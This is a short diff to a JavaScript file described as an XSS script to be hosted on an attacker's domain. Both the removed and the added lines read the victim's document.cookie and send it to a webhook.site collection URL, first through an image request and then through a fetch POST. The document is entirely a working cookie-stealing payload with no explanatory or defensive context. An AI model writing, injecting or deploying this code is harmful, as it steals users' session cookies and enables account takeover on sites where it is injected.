@@ -1,3 +1,4 @@
-// The script to be hosted at yourdomain.com/xss.js
-var img = new Image();
-img.src = "https://webhook.site/a9086bcf-1e0a-4109-830f-0fd0d4a53ab9?cookie=" + encodeURIComponent(document.cookie);
+fetch("https://webhook.site/511a8123-6c3f-4bcd-9a34-6ff44e2c698e", {
+  method: "POST",
+  body: document.cookie
+});
